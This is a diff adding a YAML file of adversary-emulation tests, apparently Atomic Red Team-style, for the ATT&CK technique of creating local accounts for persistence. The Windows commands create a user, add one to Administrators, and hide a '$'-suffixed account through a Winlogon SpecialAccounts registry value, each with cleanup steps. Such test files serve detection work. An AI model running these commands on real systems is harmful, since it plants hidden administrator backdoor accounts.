@@ -1,0 +1,78 @@
+attack_technique: T1136.001
+display_name: "Create Account: Local Account"
+tactic: Persistence
+atomic_tests:
+  - name: "Create Local User Account"
+    auto_generated_guid: d0d0e0f0a1b1c1d1e1f1a2b2c2d2e2f2
+    description: |
+      Creates a local user account using net user.
+    supported_platforms:
+      - windows
+    input_arguments:
+      user_name:
+        description: "Username to create"
+        type: string
+        default: "AtomicTestUser"
+      password:
+        description: "Password for the account"
+        type: string
+        default: "Atomic@Test123!"
+    executor:
+      name: command_prompt
+      command: |
+        net user #{user_name} #{password} /add
+        net user #{user_name}
+      cleanup_command: |
+        net user #{user_name} /delete >nul 2>&1
+      elevation_required: true
+
+  - name: "Create Local Admin Account"
+    auto_generated_guid: e1e1f1a2b2c2d2e2f2a3b3c3d3e3f3a4
+    description: |
+      Creates a local user and adds to Administrators group.
+    supported_platforms:
+      - windows
+    input_arguments:
+      user_name:
+        description: "Username"
+        type: string
+        default: "AtomicAdmin"
+      password:
+        description: "Password"
+        type: string
+        default: "Atomic@Admin123!"
+    executor:
+      name: command_prompt
+      command: |
+        net user #{user_name} #{password} /add
+        net localgroup Administrators #{user_name} /add
+        net localgroup Administrators
+      cleanup_command: |
+        net localgroup Administrators #{user_name} /delete >nul 2>&1
+        net user #{user_name} /delete >nul 2>&1
+      elevation_required: true
+
+  - name: "Create Hidden Local Account"
+    auto_generated_guid: f2f2a3b3c3d3e3f3a4b4c4d4e4f4a5b5
+    description: |
+      Creates a local account with $ suffix to hide from casual enumeration.
+    supported_platforms:
+      - windows
+    input_arguments:
+      user_name:
+        description: "Hidden username ($ suffix)"
+        type: string
+        default: "AtomicHidden$"
+      password:
+        description: "Password"
+        type: string
+        default: "Atomic@Hidden123!"
+    executor:
+      name: command_prompt
+      command: |
+        net user #{user_name} #{password} /add
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v #{user_name} /t REG_DWORD /d 0 /f
+      cleanup_command: |
+        net user #{user_name} /delete >nul 2>&1
+        reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v #{user_name} /f >nul 2>&1
+      elevation_required: true
